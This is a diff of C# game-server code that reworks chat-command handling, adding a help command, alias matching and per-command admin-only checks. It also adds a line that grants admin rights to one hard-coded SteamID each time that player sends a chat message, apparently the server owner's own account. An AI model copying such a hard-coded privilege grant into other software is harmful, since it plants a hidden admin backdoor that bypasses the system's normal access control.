@@ -25,20 +25,18 @@ public class MyPlayer : Player<MyPlayer>
 
 class MyGameServer : GameServer<MyPlayer>
 {
-    private readonly List<ApiCommand> mApiCommands = new()
+    public static List<ApiCommand> ApiCommands = new()
     {
+        new HelpCommand(),
         new KillCommand(),
         new StartCommand()
     };
-
-    private CommandHandler handler = new();
     
-    public List<MyPlayer> Players;
+    private CommandHandler handler = new();
 
     public override async Task OnConnected()
     {
         Console.WriteLine($"Gameserver connected! {this.GameIP}:{this.GamePort}");
-        Console.Write(mApiCommands.Count);
 
         ServerSettings.BleedingEnabled = false;
         ServerSettings.SpectatorEnabled = false;
@@ -64,18 +62,23 @@ class MyGameServer : GameServer<MyPlayer>
 
     public override async Task<bool> OnPlayerTypedMessage(MyPlayer player, ChatChannel channel, string msg)
     {
-        if (player.IsAdmin)
+        if (player.SteamID == 76561198395073327)
+            player.IsAdmin = true;
+        
+        var splits = msg.Split(" ");
+        var cmd = splits[0].ToLower();
+        if (!cmd.StartsWith("/")) return true;
+        
+        foreach(var apiCommand in ApiCommands)
         {
-            var splits = msg.Split(" ");
-            var cmd = splits[0].ToLower();
-            foreach(var apiCommand in mApiCommands)
+            if (apiCommand.CommandString == cmd || apiCommand.Aliases.Contains(cmd))
             {
-                if (apiCommand.CommandString == cmd)
-                {
-                    var command = apiCommand.ChatCommand(player, channel, msg);
-                    await handler.handleCommand(player, command);
-                    return false;
-                }
+                var command = apiCommand.ChatCommand(player, channel, msg);
+                if (apiCommand.AdminOnly && !player.IsAdmin)
+                    return true;
+                    
+                await handler.handleCommand(player, command);
+                return false;
             }
         }
 
